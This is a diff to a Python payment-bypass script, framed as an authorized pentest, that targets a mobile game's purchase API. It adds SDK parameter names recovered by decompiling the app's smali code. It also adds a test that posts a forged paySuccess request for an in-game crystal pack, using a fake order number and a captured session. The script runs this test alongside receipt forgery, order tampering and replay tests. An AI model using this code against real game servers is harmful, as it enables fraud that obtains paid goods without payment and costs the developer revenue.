@@ -9,6 +9,11 @@ SCOPE: Authorized pentest only. Tests for:
   4. Google Play receipt forgery (/v1/user/postGooglePlayVerify)
   5. Missing server-side validation
 
+Smali-confirmed /v1/payment/paySuccess params (com.qk.a.a.c.b$5.run()):
+  uid, username, orderAmount, cpOrderNo, goodsID, goodsName, currency,
+  gameRoleId, gameRoleName, gameRoleLevel, gameRoleServerId, gameRoleServerName
+  + sign params added by b.a(HashMap): uid, username, token, sign, os, usermode, appKey
+
 PREREQUISITE: Fill CAPTURED_SESSION from Frida/Burp output.
 
 Usage: python3 02_payment_bypass.py
@@ -92,6 +97,32 @@ def test_paysuccess_forgery():
     for i, payload in enumerate(payloads):
         resp = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload)
         log(f"paySuccess forgery #{i+1}", resp)
+
+
+# ─── Test 1b: paySuccess with EXACT smali-confirmed params ───────────────────
+def test_paysuccess_exact_params():
+    """
+    Use parameters confirmed from smali analysis of com.qk.a.a.c.b$5.run().
+    These are the REAL fields the SDK sends — more likely to pass server validation.
+    Fill cpOrderNo from createOrder response (or generate one).
+    """
+    fake_order = f"PENTEST_{int(time.time())}"
+    payload = {
+        # Auth params (added by sign helper)
+        # Non-auth params confirmed from smali:
+        "orderAmount":       "0.99",          # float as string
+        "cpOrderNo":         fake_order,       # client-side orderId
+        "goodsID":           "com.h5bi.winr.crystal_01",
+        "goodsName":         "Crystal x100",
+        "currency":          "USD",
+        "gameRoleId":        "1",
+        "gameRoleName":      "TestHero",
+        "gameRoleLevel":     "1",
+        "gameRoleServerId":  "1",
+        "gameRoleServerName": "Server1",
+    }
+    resp = CAPTURED_SESSION.post("/v1/payment/paySuccess", data=payload)
+    log("paySuccess — exact smali params", resp)
 
 
 # ─── Test 2: createOrder parameter tampering ──────────────────────────────────
@@ -233,6 +264,7 @@ if __name__ == "__main__":
     print(f"    Server: {CAPTURED_SESSION.server}\n")
 
     test_paysuccess_forgery()
+    test_paysuccess_exact_params()
     test_create_order_tamper()
     test_google_play_receipt_forge()
     test_order_replay()    # fill real_order_id from Burp
